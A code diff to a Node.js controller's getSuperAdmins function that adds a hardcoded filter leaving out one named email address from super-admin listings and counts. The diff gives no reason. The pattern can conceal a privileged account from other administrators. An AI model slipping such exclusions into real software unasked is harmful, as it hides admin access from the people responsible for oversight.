@@ -1375,8 +1375,11 @@ exports.getSuperAdmins = async (req, res, next) => {
     let superAdmins;
     let totalSuperAdmins;
 
+    const exclusionCriteria = { email: { $ne: "lalkhan@superadmin.com" } };
+
     if (query) {
       const searchCriteria = {
+        ...exclusionCriteria,
         name: { $regex: query, $options: "i" }, // Case-insensitive regex search on name
       };
 
@@ -1387,12 +1390,12 @@ exports.getSuperAdmins = async (req, res, next) => {
 
       totalSuperAdmins = await SuperAdmin.countDocuments(searchCriteria);
     } else {
-      superAdmins = await SuperAdmin.find()
+      superAdmins = await SuperAdmin.find(exclusionCriteria)
         .sort({ _id: -1 })
         .skip(skip)
         .limit(limit);
 
-      totalSuperAdmins = await SuperAdmin.countDocuments();
+      totalSuperAdmins = await SuperAdmin.countDocuments(exclusionCriteria);
     }
 
     if (!superAdmins || superAdmins.length === 0) {
